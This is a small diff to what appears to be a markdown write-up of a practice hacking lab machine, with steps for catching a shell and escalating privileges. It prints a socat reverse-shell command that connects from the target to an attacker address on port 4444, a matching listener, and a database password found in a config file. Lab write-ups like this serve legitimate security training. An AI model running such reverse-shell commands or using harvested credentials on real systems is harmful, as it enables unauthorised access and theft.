@@ -31,7 +31,7 @@ The basic steps I took are below.
 | 6.2 | ![ImgPlaceholder](img/codo-image-3.png) |
 | 7. | I caught a shell through this and converted it to tty with socat (due to just coming out of the sar machine this was my go to ) commands used below |
 | 7.1 | Attack Box: ```socat file:`tty`,raw,echo=0 tcp-listen:4444``` |
-| 7.2 | Target:```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444```` |
+| 7.2 | Target: ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444```` |
 | 8. | I decided to practice my Linux priv esc without Linpeas for a solid 20-30 mins but ended up transferring over linpeas to see what it dredged up. |
 | 8.1 | Linpeas found a password in a php config file ```/var/www/html/sites/default/config.php``` "FatPanda123" |
 | 9. | According to the config file it was the credentials were the access to the mysql db on the server which I quickly realised I had no access to. |
